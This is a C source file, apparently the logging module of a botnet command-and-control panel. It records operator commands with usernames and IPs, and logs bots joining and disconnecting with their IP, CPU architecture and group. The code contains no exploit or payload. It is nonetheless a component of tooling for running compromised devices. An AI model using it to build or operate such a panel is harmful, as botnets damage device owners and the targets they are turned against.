#include "headers/logger.h"
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <time.h>

#define CYAN "\033[1;36m"
#define DARK_RED "\033[31;2m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define RESET "\033[0m"
#define RED "\033[31m"

static void get_timestamp(char* buf, size_t len) {
    time_t now = time(NULL);
    struct tm* tm_info = localtime(&now);
    strftime(buf, len, "%Y-%m-%d %H:%M:%S", tm_info);
}

void log_command(const char* user, const char* ip, const char* command) {
    int filelogs = 1;
    int logips = 1;
    FILE* sf = fopen("options/settings.txt", "r");
    if (sf) {
        char line[128] = {0};
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "filelogs:", 9) == 0) {
                filelogs = strstr(line, "yes") ? 1 : 0;
            } else if (strncmp(line, "logips:", 7) == 0) {
                logips = strstr(line, "yes") ? 1 : 0;
            }
        }
        fclose(sf);
    }
    char logline[1024] = {0};
    char logline_plain[1024] = {0};
    char timestamp[32] = {0};
    get_timestamp(timestamp, sizeof(timestamp));
    
    if (logips) {
        snprintf(logline, sizeof(logline), "[" RED "%s" RESET "] " CYAN "%s" RESET " ran command: " YELLOW "%s" RESET "\n", ip, user, command);
        snprintf(logline_plain, sizeof(logline_plain), "[%s] %s ran command: %s\n", ip, user, command);
    } else {
        snprintf(logline, sizeof(logline), CYAN "%s" RESET " ran command: " YELLOW "%s" RESET "\n", user, command);
        snprintf(logline_plain, sizeof(logline_plain), "%s ran command: %s\n", user, command);
    }
    printf("%s", logline);
    if (filelogs) {
        FILE* f = fopen("database/userlogs.txt", "a");
        if (f) {
            fprintf(f, "[%s] %s", timestamp, logline_plain);
            fclose(f);
        }
    }

}

void log_bot_join(const char* arch, const char* ip, const char* group) {
    int filelogs = 1;
    int loggroups = 0;
    FILE* sf = fopen("options/settings.txt", "r");
    if (sf) {
        char line[128] = {0};
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "filelogs:", 9) == 0) {
                filelogs = strstr(line, "yes") ? 1 : 0;
            } else if (strncmp(line, "loggroups:", 10) == 0) {
                loggroups = strstr(line, "yes") ? 1 : 0;
            }
        }
        fclose(sf);
    }
    char logline[1024] = {0};
    char logline_plain[1024] = {0};
    if (loggroups && group && group[0]) {
        snprintf(logline, sizeof(logline), CYAN "[BOT_JOINED]: " RESET DARK_RED "%s" RESET " | " GREEN "Architecture:" RESET " " CYAN "%s" RESET " | " GREEN "TYPE: " DARK_RED "%s\n", ip, arch, group);
        snprintf(logline_plain, sizeof(logline_plain), "[BOT_JOINED]: %s | Architecture: %s | TYPE: %s\n", ip, arch, group);
    } else {
        snprintf(logline, sizeof(logline), CYAN "[BOT_JOINED]: " RESET DARK_RED "%s" RESET " | " GREEN "Architecture:" RESET " " CYAN "%s" RESET "\n", ip, arch);
        snprintf(logline_plain, sizeof(logline_plain), "[BOT_JOINED]: %s | Architecture: %s\n", ip, arch);
    }
    printf("%s", logline);
    if (filelogs) {
        FILE* f = fopen("database/logs.txt", "a");
        if (f) {
            fputs(logline_plain, f);
            fclose(f);
        }
    }
}

void log_bot_disconnected(const char* ip, const char* arch, const char* cause) {
    int filelogs = 1;
    FILE* sf = fopen("options/settings.txt", "r");
    if (sf) {
        char line[128] = {0};
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "filelogs:", 9) == 0) {
                filelogs = strstr(line, "yes") ? 1 : 0;
            }
        }
        fclose(sf);
    }
    char logline[1024] = {0};
    char logline_plain[1024] = {0};
    snprintf(logline, sizeof(logline), CYAN "[BOT_DISCONNECTED]: " RESET DARK_RED "%s" RESET " Arch: " CYAN "%s" RESET " Cause: " YELLOW "%s" RESET "\n", ip, arch, cause);
    snprintf(logline_plain, sizeof(logline_plain), "[BOT_DISCONNECTED]: %s Arch: %s Cause: %s\n", ip, arch, cause);
    printf("%s", logline);
    if (filelogs) {
        FILE* f = fopen("database/logs.txt", "a");
        if (f) {
            fputs(logline_plain, f);
            fclose(f);
        }
    }
}